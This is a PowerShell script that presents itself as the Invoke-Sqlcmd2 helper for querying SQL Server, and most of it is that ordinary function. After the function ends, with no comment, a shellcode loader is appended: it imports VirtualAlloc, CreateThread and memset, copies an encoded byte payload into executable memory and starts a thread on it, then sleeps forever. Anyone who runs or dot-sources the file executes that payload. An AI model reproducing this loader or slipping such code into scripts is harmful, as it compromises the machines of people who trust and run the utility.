function Invoke-Sqlcmd2
{
    

    [CmdletBinding( DefaultParameterSetName='Ins-Que' )]
    [OutputType([System.Management.Automation.PSCustomObject],[System.Data.DataRow],[System.Data.DataTable],[System.Data.DataTableCollection],[System.Data.DataSet])]
    param(
        [Parameter( ParameterSetName='Ins-Que',
                    Position=0,
                    Mandatory=$true,
                    ValueFromPipeline=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false,
                    HelpMessage='SQL Server Instance required...' )]
        [Parameter( ParameterSetName='Ins-Fil',
                    Position=0,
                    Mandatory=$true,
                    ValueFromPipeline=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false,
                    HelpMessage='SQL Server Instance required...' )]
        [Alias( 'Instance', 'Instances', 'ComputerName', 'Server', 'Servers' )]
        [ValidateNotNullOrEmpty()]
        [string[]]
        $ServerInstance,

        [Parameter( Position=1,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false)]
        [string]
        $Database,

        [Parameter( ParameterSetName='Ins-Que',
                    Position=2,
                    Mandatory=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [Parameter( ParameterSetName='Con-Que',
                    Position=2,
                    Mandatory=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [string]
        $Query,

        [Parameter( ParameterSetName='Ins-Fil',
                    Position=2,
                    Mandatory=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [Parameter( ParameterSetName='Con-Fil',
                    Position=2,
                    Mandatory=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [ValidateScript({ Test-Path $_ })]
        [string]
        $InputFile,

        [Parameter( ParameterSetName='Ins-Que',
                    Position=3,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false)]
        [Parameter( ParameterSetName='Ins-Fil',
                    Position=3,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false)]
        [System.Management.Automation.PSCredential]
        $Credential,

        [Parameter( ParameterSetName='Ins-Que',
                    Position=4,
                    Mandatory=$false,
                    ValueFromRemainingArguments=$false)]
        [Parameter( ParameterSetName='Ins-Fil',
                    Position=4,
                    Mandatory=$false,
                    ValueFromRemainingArguments=$false)]
        [switch]
        $Encrypt,

        [Parameter( Position=5,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [Int32]
        $QueryTimeout=600,

        [Parameter( ParameterSetName='Ins-Fil',
                    Position=6,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [Parameter( ParameterSetName='Ins-Que',
                    Position=6,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [Int32]
        $ConnectionTimeout=15,

        [Parameter( Position=7,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [ValidateSet("DataSet", "DataTable", "DataRow","PSObject","SingleValue")]
        [string]
        $As="DataRow",

        [Parameter( Position=8,
                    Mandatory=$false,
                    ValueFromPipelineByPropertyName=$true,
                    ValueFromRemainingArguments=$false )]
        [System.Collections.IDictionary]
        $SqlParameters,

        [Parameter( Position=9,
                    Mandatory=$false )]
        [switch]
        $AppendServerInstance,

        [Parameter( ParameterSetName = 'Con-Que',
                    Position=10,
                    Mandatory=$false,
                    ValueFromPipeline=$false,
                    ValueFromPipelineByPropertyName=$false,
                    ValueFromRemainingArguments=$false )]
        [Parameter( ParameterSetName = 'Con-Fil',
                    Position=10,
                    Mandatory=$false,
                    ValueFromPipeline=$false,
                    ValueFromPipelineByPropertyName=$false,
                    ValueFromRemainingArguments=$false )]
        [Alias( 'Connection', 'Conn' )]
        [ValidateNotNullOrEmpty()]
        [System.Data.SqlClient.SQLConnection]
        $SQLConnection
    )

    Begin
    {
        if ($InputFile)
        {
            $filePath = $(Resolve-Path $InputFile).path
            $Query =  [System.IO.File]::ReadAllText("$filePath")
        }

        Write-Verbose "Running Invoke-Sqlcmd2 with ParameterSet '$($PSCmdlet.ParameterSetName)'.  Performing query '$Query'"

        If($As -eq "PSObject")
        {
            
            $cSharp = @'
                using System;
                using System.Data;
                using System.Management.Automation;

                public class DBNullScrubber
                {
                    public static PSObject DataRowToPSObject(DataRow row)
                    {
                        PSObject psObject = new PSObject();

                        if (row != null && (row.RowState & DataRowState.Detached) != DataRowState.Detached)
                        {
                            foreach (DataColumn column in row.Table.Columns)
                            {
                                Object value = null;
                                if (!row.IsNull(column))
                                {
                                    value = row[column];
                                }

                                psObject.Properties.Add(new PSNoteProperty(column.ColumnName, value));
                            }
                        }

                        return psObject;
                    }
                }
'@

            Try
            {
                Add-Type -TypeDefinition $cSharp -ReferencedAssemblies 'System.Data','System.Xml' -ErrorAction stop
            }
            Catch
            {
                If(-not $_.ToString() -like "*The type name 'DBNullScrubber' already exists*")
                {
                    Write-Warning "Could not load DBNullScrubber.  Defaulting to DataRow output: $_"
                    $As = "Datarow"
                }
            }
        }

        
        if($PSBoundParameters.ContainsKey('SQLConnection'))
        {
            if($SQLConnection.State -notlike "Open")
            {
                Try
                {
                    Write-Verbose "Opening connection from '$($SQLConnection.State)' state"
                    $SQLConnection.Open()
                }
                Catch
                {
                    Throw $_
                }
            }

            if($Database -and $SQLConnection.Database -notlike $Database)
            {
                Try
                {
                    Write-Verbose "Changing SQLConnection database from '$($SQLConnection.Database)' to $Database"
                    $SQLConnection.ChangeDatabase($Database)
                }
                Catch
                {
                    Throw "Could not change Connection database '$($SQLConnection.Database)' to $Database`: $_"
                }
            }

            if($SQLConnection.state -like "Open")
            {
                $ServerInstance = @($SQLConnection.DataSource)
            }
            else
            {
                Throw "SQLConnection is not open"
            }
        }

    }
    Process
    {
        foreach($SQLInstance in $ServerInstance)
        {
            Write-Verbose "Querying ServerInstance '$SQLInstance'"

            if($PSBoundParameters.Keys -contains "SQLConnection")
            {
                $Conn = $SQLConnection
            }
            else
            {
                if ($Credential)
                {
                    $ConnectionString = "Server={0};Database={1};User ID={2};Password=`"{3}`";Trusted_Connection=False;Connect Timeout={4};Encrypt={5}" -f $SQLInstance,$Database,$Credential.UserName,$Credential.GetNetworkCredential().Password,$ConnectionTimeout,$Encrypt
                }
                else
                {
                    $ConnectionString = "Server={0};Database={1};Integrated Security=True;Connect Timeout={2};Encrypt={3}" -f $SQLInstance,$Database,$ConnectionTimeout,$Encrypt
                }

                $conn = New-Object System.Data.SqlClient.SQLConnection
                $conn.ConnectionString = $ConnectionString
                Write-Debug "ConnectionString $ConnectionString"

                Try
                {
                    $conn.Open()
                }
                Catch
                {
                    Write-Error $_
                    continue
                }
            }

            
            if ($PSBoundParameters.Verbose)
            {
                $conn.FireInfoMessageEventOnUserErrors=$false 
                $handler = [System.Data.SqlClient.SqlInfoMessageEventHandler] { Write-Verbose "$($_)" }
                $conn.add_InfoMessage($handler)
            }

            $cmd = New-Object system.Data.SqlClient.SqlCommand($Query,$conn)
            $cmd.CommandTimeout=$QueryTimeout

            if ($SqlParameters -ne $null)
            {
                $SqlParameters.GetEnumerator() |
                    ForEach-Object {
                        If ($_.Value -ne $null)
                        { $cmd.Parameters.AddWithValue($_.Key, $_.Value) }
                        Else
                        { $cmd.Parameters.AddWithValue($_.Key, [DBNull]::Value) }
                    } > $null
            }

            $ds = New-Object system.Data.DataSet
            $da = New-Object system.Data.SqlClient.SqlDataAdapter($cmd)

            Try
            {
                [void]$da.fill($ds)
            }
            Catch [System.Data.SqlClient.SqlException] 
            {
                $Err = $_

                Write-Verbose "Capture SQL Error"

                if ($PSBoundParameters.Verbose) {Write-Verbose "SQL Error:  $Err"} 

                switch ($ErrorActionPreference.tostring())
                {
                    {'SilentlyContinue','Ignore' -contains $_} {}
                    'Stop' {     Throw $Err }
                    'Continue' { Throw $Err}
                    Default {    Throw $Err}
                }
            }
            Catch 
            {
                Write-Verbose "Capture Other Error"  

                $Err = $_

                if ($PSBoundParameters.Verbose) {Write-Verbose "Other Error:  $Err"} 

                switch ($ErrorActionPreference.tostring())
                {
                    {'SilentlyContinue','Ignore' -contains $_} {}
                    'Stop' {     Throw $Err}
                    'Continue' { Throw $Err}
                    Default {    Throw $Err}
                }
            }
            Finally
            {
                
                if(-not $PSBoundParameters.ContainsKey('SQLConnection'))
                {
                    $conn.Close()
                }               
            }

            if($AppendServerInstance)
            {
                
                $Column =  New-Object Data.DataColumn
                $Column.ColumnName = "ServerInstance"
                $ds.Tables[0].Columns.Add($Column)
                Foreach($row in $ds.Tables[0])
                {
                    $row.ServerInstance = $SQLInstance
                }
            }

            switch ($As)
            {
                'DataSet'
                {
                    $ds
                }
                'DataTable'
                {
                    $ds.Tables
                }
                'DataRow'
                {
                    $ds.Tables[0]
                }
                'PSObject'
                {
                    
                    
                    foreach ($row in $ds.Tables[0].Rows)
                    {
                        [DBNullScrubber]::DataRowToPSObject($row)
                    }
                }
                'SingleValue'
                {
                    $ds.Tables[0] | Select-Object -ExpandProperty $ds.Tables[0].Columns[0].ColumnName
                }
            }
        }
    }
} 
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xca,0xba,0x03,0x54,0x42,0x70,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x50,0x18,0x03,0x50,0x18,0x83,0xc0,0x07,0xb6,0xb7,0x8c,0xef,0xb4,0x38,0x6d,0xef,0xd8,0xb1,0x88,0xde,0xd8,0xa6,0xd9,0x70,0xe9,0xad,0x8c,0x7c,0x82,0xe0,0x24,0xf7,0xe6,0x2c,0x4a,0xb0,0x4d,0x0b,0x65,0x41,0xfd,0x6f,0xe4,0xc1,0xfc,0xa3,0xc6,0xf8,0xce,0xb1,0x07,0x3d,0x32,0x3b,0x55,0x96,0x38,0xee,0x4a,0x93,0x75,0x33,0xe0,0xef,0x98,0x33,0x15,0xa7,0x9b,0x12,0x88,0xbc,0xc5,0xb4,0x2a,0x11,0x7e,0xfd,0x34,0x76,0xbb,0xb7,0xcf,0x4c,0x37,0x46,0x06,0x9d,0xb8,0xe5,0x67,0x12,0x4b,0xf7,0xa0,0x94,0xb4,0x82,0xd8,0xe7,0x49,0x95,0x1e,0x9a,0x95,0x10,0x85,0x3c,0x5d,0x82,0x61,0xbd,0xb2,0x55,0xe1,0xb1,0x7f,0x11,0xad,0xd5,0x7e,0xf6,0xc5,0xe1,0x0b,0xf9,0x09,0x60,0x4f,0xde,0x8d,0x29,0x0b,0x7f,0x97,0x97,0xfa,0x80,0xc7,0x78,0xa2,0x24,0x83,0x94,0xb7,0x54,0xce,0xf0,0x74,0x55,0xf1,0x00,0x13,0xee,0x82,0x32,0xbc,0x44,0x0d,0x7e,0x35,0x43,0xca,0x81,0x6c,0x33,0x44,0x7c,0x8f,0x44,0x4c,0xba,0xdb,0x14,0xe6,0x6b,0x64,0xff,0xf6,0x94,0xb1,0x6a,0xf2,0x02,0x6c,0x02,0x1f,0xc2,0xf8,0xd6,0xdf,0xf3,0x39,0x5f,0x39,0xa3,0xe9,0x30,0x96,0x03,0x5a,0xf1,0x46,0xeb,0xb0,0xfe,0xb9,0x0b,0xbb,0xd4,0xd1,0xa1,0x54,0x81,0x8a,0x5d,0xcc,0x88,0x41,0xfc,0x11,0x07,0x2c,0x3e,0x99,0xa4,0xd0,0xf0,0x6a,0xc0,0xc2,0x64,0x9b,0x9f,0xb9,0x22,0xa4,0x35,0xd7,0xca,0x30,0xb2,0x7e,0x9d,0xac,0xb8,0xa7,0xe9,0x72,0x42,0x82,0x62,0xba,0xd6,0x6d,0x1c,0xc3,0x36,0x6e,0xdc,0x95,0x5c,0x6e,0xb4,0x41,0x05,0x3d,0xa1,0x8d,0x90,0x51,0x7a,0x18,0x1b,0x00,0x2f,0x8b,0x73,0xae,0x16,0xfb,0xdb,0x51,0x7d,0xfd,0x20,0x84,0xbb,0x8b,0x48,0x14;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

